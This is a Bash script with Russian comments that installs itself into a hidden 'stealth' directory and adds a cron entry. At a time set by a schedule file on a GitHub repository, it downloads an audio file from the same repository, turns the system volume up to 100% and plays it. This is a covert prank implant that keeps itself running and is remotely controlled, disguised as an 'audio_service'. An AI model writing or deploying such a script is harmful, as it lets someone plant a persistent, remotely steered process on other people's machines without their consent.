#!/bin/bash

# Конфигурация GitHub
GITHUB_USER="Graf-Durka"
GITHUB_REPO="Script"
GITHUB_BRANCH="main"

# URL ресурсов на GitHub
SCHEDULE_URL="https://raw.githubusercontent.com/$GITHUB_USER/$GITHUB_REPO/$GITHUB_BRANCH/schedule.txt"
AUDIO_URL="https://raw.githubusercontent.com/$GITHUB_USER/$GITHUB_REPO/$GITHUB_BRANCH/audio.opus"

# Локальные настройки
STEALTH_DIR="$HOME/.local/share/audio_service"
TEMP_AUDIO="/dev/shm/audio_$(date +%s).opus"
LOCK_FILE="/tmp/audio_service.lock"

# Функция загрузки файла с GitHub
download_from_github() {
    local url="$1"
    local output="$2"
    
    if command -v curl >/dev/null; then
        curl -sSL --connect-timeout 10 --retry 2 "$url" -o "$output"
    elif command -v wget >/dev/null; then
        wget -q --timeout=10 --tries=2 "$url" -O "$output"
    else
        echo "Ошибка: Не найден curl или wget!" >&2
        return 1
    fi
    
    # Проверяем, что файл не пустой
    if [[ ! -s "$output" ]]; then
        rm -f "$output"
        return 1
    fi
    return 0
}

# Функция получения времени запуска
get_schedule_time() {
    local schedule_file="/dev/shm/schedule_$(date +%s).txt"
    
    # Пытаемся загрузить актуальное расписание
    if download_from_github "$SCHEDULE_URL" "$schedule_file"; then
        # Читаем время из файла (формат: HH:MM)
        SCHEDULE_TIME=$(head -1 "$schedule_file" | grep -E '^([0-1][0-9]|2[0-3]):[0-5][0-9]$')
        rm -f "$schedule_file"
        
        if [[ -n "$SCHEDULE_TIME" ]]; then
            echo "$SCHEDULE_TIME"
            return 0
        fi
    fi
    
    # Fallback: случайное время, если не удалось загрузить
    printf "%02d:%02d" $((RANDOM % 24)) $((RANDOM % 60))
}

# Функция обновления cron
update_cron_job() {
    local schedule_time=$(get_schedule_time)
    local hour=$(echo "$schedule_time" | cut -d: -f1)
    local minute=$(echo "$schedule_time" | cut -d: -f2)
    
    # Удаляем старые записи
    crontab -l 2>/dev/null | grep -v "AUDIO_SERVICE_GH" | crontab -
    
    # Добавляем новую запись
    CRON_JOB="$minute $hour * * * $STEALTH_DIR/audio_service.sh --play #AUDIO_SERVICE_GH"
    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
    
    echo "Установлено время: $schedule_time"
}

# Функция установки
install_self() {
    mkdir -p "$STEALTH_DIR"
    
    # Сохраняем скрипт из stdin (pipe) в файл
    cat > "$STEALTH_DIR/audio_service.sh" << 'EOF'
#!/bin/bash

# Конфигурация GitHub
GITHUB_USER="Graf-Durka"
GITHUB_REPO="Script"
GITHUB_BRANCH="main"

# URL ресурсов на GitHub
SCHEDULE_URL="https://raw.githubusercontent.com/$GITHUB_USER/$GITHUB_REPO/$GITHUB_BRANCH/schedule.txt"
AUDIO_URL="https://raw.githubusercontent.com/$GITHUB_USER/$GITHUB_REPO/$GITHUB_BRANCH/audio.opus"

# Локальные настройки
STEALTH_DIR="$HOME/.local/share/audio_service"
TEMP_AUDIO="/dev/shm/audio_$(date +%s).opus"
LOCK_FILE="/tmp/audio_service.lock"

# Функция загрузки файла с GitHub
download_from_github() {
    local url="$1"
    local output="$2"
    
    if command -v curl >/dev/null; then
        curl -sSL --connect-timeout 10 --retry 2 "$url" -o "$output"
    elif command -v wget >/dev/null; then
        wget -q --timeout=10 --tries=2 "$url" -O "$output"
    else
        echo "Ошибка: Не найден curl или wget!" >&2
        return 1
    fi
    
    # Проверяем, что файл не пустой
    if [[ ! -s "$output" ]]; then
        rm -f "$output"
        return 1
    fi
    return 0
}

# Функция получения времени запуска
get_schedule_time() {
    local schedule_file="/dev/shm/schedule_$(date +%s).txt"
    
    # Пытаемся загрузить актуальное расписание
    if download_from_github "$SCHEDULE_URL" "$schedule_file"; then
        # Читаем время из файла (формат: HH:MM)
        SCHEDULE_TIME=$(head -1 "$schedule_file" | grep -E '^([0-1][0-9]|2[0-3]):[0-5][0-9]$')
        rm -f "$schedule_file"
        
        if [[ -n "$SCHEDULE_TIME" ]]; then
            echo "$SCHEDULE_TIME"
            return 0
        fi
    fi
    
    # Fallback: случайное время, если не удалось загрузить
    printf "%02d:%02d" $((RANDOM % 24)) $((RANDOM % 60))
}

# Функция обновления cron
update_cron_job() {
    local schedule_time=$(get_schedule_time)
    local hour=$(echo "$schedule_time" | cut -d: -f1)
    local minute=$(echo "$schedule_time" | cut -d: -f2)
    
    # Удаляем старые записи
    crontab -l 2>/dev/null | grep -v "AUDIO_SERVICE_GH" | crontab -
    
    # Добавляем новую запись
    CRON_JOB="$minute $hour * * * $STEALTH_DIR/audio_service.sh --play #AUDIO_SERVICE_GH"
    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
    
    echo "Установлено время: $schedule_time"
}

# Функция воспроизведения
play_audio() {
    # Блокировка от параллельного выполнения
    exec 9>"$LOCK_FILE"
    flock -n 9 || exit 1
    
    # Загружаем аудио с GitHub
    if ! download_from_github "$AUDIO_URL" "$TEMP_AUDIO"; then
        echo "Не удалось загрузить аудио!" >&2
        flock -u 9
        return 1
    fi
    
    # Управление громкостью
    if command -v pactl &>/dev/null; then
        ORIG_VOL=$(pactl get-sink-volume @DEFAULT_SINK@ | grep -oP '\d+%' | head -1)
        pactl set-sink-volume @DEFAULT_SINK@ 100%
    fi
    
    # Воспроизведение (OPUS → PCM через ffmpeg)
    if command -v ffmpeg &>/dev/null; then
        ffmpeg -loglevel quiet -i "$TEMP_AUDIO" -f wav - | \
        paplay - 2>/dev/null || aplay - 2>/dev/null
    else
        # Fallback: пытаемся проиграть напрямую
        paplay "$TEMP_AUDIO" 2>/dev/null || aplay "$TEMP_AUDIO" 2>/dev/null
    fi
    
    # Восстановление системы
    sleep 0.5
    [[ -n "$ORIG_VOL" ]] && pactl set-sink-volume @DEFAULT_SINK@ "$ORIG_VOL"
    rm -f "$TEMP_AUDIO"
    flock -u 9
    
    # Обновляем расписание после воспроизведения
    update_cron_job
}

# Точка входа
case "$1" in
    "--play")
        play_audio
        ;;
    *)
        update_cron_job
        ;;
esac
EOF

    chmod +x "$STEALTH_DIR/audio_service.sh"
    update_cron_job
    
    echo "Скрипт успешно установлен!"
}

# Точка входа
case "${1:-}" in
    "--play")
        # Этот код выполняется только в резидентной копии
        PLAY_SCRIPT="$STEALTH_DIR/audio_service.sh"
        if [[ -f "$PLAY_SCRIPT" ]]; then
            exec "$PLAY_SCRIPT" "$@"
        else
            echo "Ошибка: Резидентная копия не найдена!" >&2
            exit 1
        fi
        ;;
    *)
        install_self
        ;;
esac
